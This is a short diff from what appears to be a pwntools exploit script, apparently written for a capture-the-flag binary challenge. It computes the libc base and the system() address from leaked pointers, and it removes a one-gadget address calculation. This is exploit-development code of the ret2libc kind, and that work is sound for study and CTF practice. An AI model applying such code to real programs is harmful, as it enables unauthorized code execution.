@@ -32,12 +32,10 @@ puts_addr = u64(puts_addr + b"\x00" * (8 - len(puts_addr)))
 return_addr = int(r.recvuntil("!")[:-1], 16) + (0x7fffffffe4e8 - 0x7fffffffe5c0)
 
 libc_base = puts_addr - puts_offset
-onegadget_addr = libc_base + onegadget_offset
 system_addr = libc_base + system_offset
 
 log.info("libc_base = {}".format(hex(libc_base)))
 log.info("return_addr = {}".format(hex(return_addr)))
-log.info("onegadget_addr = {}".format(hex(onegadget_addr)))
 log.info("puts_addr = {}".format(hex(puts_addr)))
 
 if (system_addr & 0xffffffff) >= 0x10000000:
